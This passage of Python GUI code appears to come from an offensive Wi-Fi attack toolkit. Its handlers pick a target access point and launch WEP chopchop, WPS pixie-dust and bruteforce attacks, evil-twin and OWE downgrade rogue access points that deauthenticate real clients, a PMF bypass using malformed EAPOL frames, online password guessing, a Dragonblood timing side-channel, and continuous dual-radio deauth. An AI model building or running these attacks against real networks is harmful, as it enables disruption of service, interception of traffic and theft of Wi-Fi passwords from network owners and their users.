        if not ap:
            return
        if not self.own_mac:
            messagebox.showwarning("ATWA-NG", "Own MAC not known yet — restart monitor mode.")
            return
        if not self._confirm_attack(
            "WEP Chopchop",
            f"Chopchop decrypt against {ap.bssid} ({ap.ssid or '<hidden>'}) via the vendored "
            "aireplay-ng -4/--chopchop.\nRequires a genuine WEP AP with WEP data traffic — "
            "a WPA/WPA2-only target (or a silent one) will just run out the clock.",
        ):
            return
        self._run_bg(f"WEP Chopchop on {ap.bssid}", self._runner().chopchop, ap)


    def _attack_wps_null_pin(self):
        ap = self._require_target()
        if not ap:
            return
        if not ap.ssid:
            messagebox.showwarning("ATWA-NG", "WPS attack needs a known SSID.")
            return
        if not self._confirm_attack("WPS Null-PIN", f"One-shot null-PIN attempt against {ap.bssid} ({ap.ssid})."):
            return
        self._run_bg(f"WPS null-PIN on {ap.bssid}", self._runner().wps_null_pin, ap)


    def _attack_wps_pixie(self):
        ap = self._require_target()
        if not ap:
            return
        if not ap.ssid:
            messagebox.showwarning("ATWA-NG", "WPS attack needs a known SSID.")
            return
        if not self._confirm_attack(
            "WPS Pixie-Dust",
            f"Offline pixie-dust against {ap.bssid} ({ap.ssid}).\n"
            "Requires one M1→M3 exchange to capture crypto material.",
        ):
            return
        self._run_bg(f"WPS pixie-dust on {ap.bssid}", self._runner().wps_pixie, ap)


    def _attack_wps_bruteforce(self):
        ap = self._require_target()
        if not ap:
            return
        if not ap.ssid:
            messagebox.showwarning("ATWA-NG", "WPS attack needs a known SSID.")
            return
        warned = messagebox.askokcancel(
            "ATWA-NG",
            "WPS bruteforce is currently EXPERIMENTAL — across multiple live sessions "
            "it has never completed a real M2→M3 exchange against a test AP (see "
            "STATUS.md). It may just time out repeatedly. Continue anyway?",
        )
        if not warned:
            return
        self._run_bg(f"WPS bruteforce on {ap.bssid}", self._runner().wps_bruteforce, ap)


    def _attack_downgrade_twin(self):
        ap = self._require_target()
        if not ap:
            return
        if not ap.ssid:
            messagebox.showwarning("ATWA-NG", "Downgrade Twin needs a known SSID.")
            return
        iface_ap = self.iface_ap_var.get().strip()
        if not iface_ap:
            messagebox.showerror(
                "ATWA-NG",
                "No AP interface configured.\n\n"
                "Pick one in the toolbar's 'AP iface' dropdown (the ACHM "
                "adapter, in managed mode, distinct from the scan/monitor "
                "adapter).",
            )
            return
        if iface_ap == self.mon_iface:
            messagebox.showerror(
                "ATWA-NG",
                f"AP interface ({iface_ap}) is the same as the monitor "
                f"interface ({self.mon_iface}).\n\n"
                "Downgrade Twin needs two separate adapters: one to host "
                "the rogue twin, one to stay in monitor mode for deauth.",
            )
            return
        if not self._confirm_attack(
            "Downgrade Twin",
            f"Portal-free WPA2-only rogue twin of {ap.bssid} ({ap.ssid}).\n\n"
            f"AP interface: {iface_ap}  |  Monitor: {self.mon_iface}\n"
            "Will deauth real clients and passively capture a 4-way "
            "handshake if one reconnects to the twin using its real "
            "password. No captive portal.",
        ):
            return
        self._run_bg(f"Downgrade Twin on {ap.bssid}", self._runner().downgrade_twin, ap, iface_ap)


    def _attack_pmf_bypass(self):
        ap = self._require_target()
        if not ap or not ap.ssid:
            messagebox.showwarning("ATWA-NG", "PMF Bypass needs a selected target with a known SSID.")
            return
        iface_ap = self.iface_ap_var.get().strip()
        if not iface_ap or iface_ap == self.mon_iface:
            messagebox.showerror("ATWA-NG", "PMF Bypass needs a separate AP interface from the monitor interface.")
            return
        if not self._confirm_attack(
            "PMF Bypass Reconnect",
            f"Portal-free PMF-required rogue twin of {ap.bssid} ({ap.ssid}).\n\n"
            f"AP interface: {iface_ap}  |  Monitor: {self.mon_iface}\n"
            "Will wait for a client to associate, inject the malformed EAPOL "
            "reconnect stimulus, and capture the resulting handshake.",
        ):
            return
        self._run_bg(f"PMF Bypass on {ap.bssid}", self._runner().pmf_bypass, ap, iface_ap)


    def _attack_owe_downgrade(self):
        ap = self._require_target()
        if not ap:
            return
        if not ap.owe_transition_ssid:
            messagebox.showwarning(
                "ATWA-NG",
                "OWE Downgrade needs a target with an OWE Transition Mode IE "
                "(a paired open SSID advertised alongside it) -- this AP "
                "doesn't have one.",
            )
            return
        iface_ap = self.iface_ap_var.get().strip()
        if not iface_ap:
            messagebox.showerror(
                "ATWA-NG",
                "No AP interface configured.\n\n"
                "Pick one in the toolbar's 'AP iface' dropdown (the ACHM "
                "adapter, in managed mode, distinct from the scan/monitor "
                "adapter).",
            )
            return
        if iface_ap == self.mon_iface:
            messagebox.showerror(
                "ATWA-NG",
                f"AP interface ({iface_ap}) is the same as the monitor "
                f"interface ({self.mon_iface}).\n\n"
                "OWE Downgrade needs two separate adapters: one to host "
                "the rogue open twin, one to stay in monitor mode for "
                "deauth.",
            )
            return
        if not self._confirm_attack(
            "OWE Downgrade",
            f"Rogue open twin of the paired network {ap.owe_transition_ssid!r}, "
            f"deauthing clients off the real OWE AP {ap.bssid}.\n\n"
            f"AP interface: {iface_ap}  |  Monitor: {self.mon_iface}\n"
            "Clients falling back to the open twin lose OWE encryption "
            "entirely. No captive portal.",
        ):
            return
        self._run_bg(f"OWE Downgrade on {ap.bssid}", self._runner().owe_downgrade, ap, iface_ap)


    def _attack_online_guess(self):
        """Live per-password 4-way handshake attempt against the AP itself
        (attacks/online.py) -- the standalone version of OMNI's ONLINE
        stage, for running it on its own instead of the full chain (e.g.
        PMF blocks the HANDSHAKE stage's deauth, so this is a way to still
        try a wordlist against the target)."""
        ap = self._require_target()
        if not ap:
            return
        if not ap.ssid:
            messagebox.showwarning("ATWA-NG", "Online guessing needs a known SSID.")
            return
        if ap.security not in ("WPA", "WPA2", "transition"):
            messagebox.showwarning(
                "ATWA-NG",
                f"Online guessing needs a PSK-based network (WPA/WPA2/transition) — "
                f"this target is {ap.security}. WPA3/SAE-only and WEP aren't supported "
                "(see attacks/online.py).",
            )
            return
        if not self.own_mac:
            messagebox.showwarning("ATWA-NG", "Own MAC not known yet — restart monitor mode.")
            return
        wordlist = self.wordlist_var.get()
        if not wordlist:
            messagebox.showwarning("ATWA-NG", "Set a wordlist first (File > Set Wordlist).")
            return
        if not self._confirm_attack(
            "Online Password Guess",
            f"Live password guessing against {ap.bssid} ({ap.ssid}) using {wordlist}.\n\n"
            "Slow by design (one real association + 4-way handshake per candidate, "
            "~1-3s each) and noisy — every attempt is visible to the AP.",
        ):
            return
        self._run_bg(f"Online guess on {ap.bssid}", self._runner().online_guess, ap)


    def _attack_dragonblood(self):
        """SAE (WPA3) timing side-channel wordlist pruning (CVE-2019-9494,
        attacks/dragonblood.py) -- only meaningful against an unpatched
        pre-hostapd-2.10 AP (mid-2019), and its core KDF math is flagged
        unverified against a real spec/capture (see that module's
        docstring). Confirm dialog says so up front rather than presenting
        this as a proven working attack."""
        ap = self._require_target()
        if not ap:
            return
        if ap.security not in ("WPA3", "transition"):
            messagebox.showwarning(
                "ATWA-NG",
                f"Dragonblood targets SAE (WPA3) — this AP is {ap.security}, which doesn't "
                "run the SAE handshake this timing side-channel needs.",
            )
            return
        wordlist = self.wordlist_var.get()
        if not wordlist:
            messagebox.showwarning("ATWA-NG", "Set a wordlist first (File > Set Wordlist).")
            return
        if not self._confirm_attack(
            "Dragonblood",
            f"SAE timing side-channel wordlist pruning against {ap.bssid} ({ap.ssid}).\n\n"
            "⚠ Only works against an UNPATCHED AP (pre-hostapd-2.10, mid-2019) — modern "
            "APs run a fixed-time loop with no timing signal to measure.\n"
            "⚠ The core math (KDF byte layout) is unit-tested for internal consistency "
            "only, NOT verified against the real spec or a real capture — treat pruning "
            "results with real skepticism.\n\n"
            f"Sends several SAE Commit frames from spoofed MACs and measures reply timing "
            f"using {wordlist}.",
        ):
            return
        self._run_bg(f"Dragonblood on {ap.bssid}", self._runner().dragonblood, ap)


    def _attack_pincer(self):
        """Flagship dual-Alfa mode (STATUS.md 'Ideas/undecided', 2026-08-14
        — one special locked/hidden attack, not folded into the default
        single-adapter path). Split-role, proven live that session: the
        AWUS036ACHM (mt76x0u, wider scan range) stays parked on the
        target's channel doing nothing but listen for the handshake, while
        the AWUS1900/RTL8814AU (rtw88_8814au, 3x3 antennas) does nothing but hammer
        deauth — neither radio ever time-shares between scanning and
        attacking, unlike single-adapter mode. Gated entirely on
        radio.detect_alfa_pair(); the menu entry is disabled without both
        specific adapters present."""
        ap = self._require_target()
        if not ap:
            return
        if not self.alfa_pair:
            messagebox.showwarning("ATWA-NG", "PINCER needs both Alfa adapters connected (AWUS036ACHM + AWUS1900).")
            return
        scan_iface, attack_iface = self.alfa_pair
        if ap.pmf == "required":
            radio_note = (
                "PMF is required on this target, so deauth would be dropped anyway — "
                "PINCER will skip the attack entirely and leave both radios untouched."
            )
        else:
            radio_note = "Both radios go to monitor mode and back when done."
        if not self._confirm_attack(
            "PINCER (Dual-Alfa)",
            f"{scan_iface} listens on {ap.bssid} ({ap.ssid or '<hidden>'}) while {attack_iface} "
            f"deauths continuously. {radio_note}",
        ):
            return
        self._run_bg(
            f"PINCER on {ap.bssid}",
            self._runner().pincer,
            ap, scan_iface, attack_iface, self.randomize_mac_var.get(),
            self._watch_capture_size,
        )

    # ------------------------------------------------------------------

    # ------------------------------------------------------------------
    # Captures tab
    # ------------------------------------------------------------------
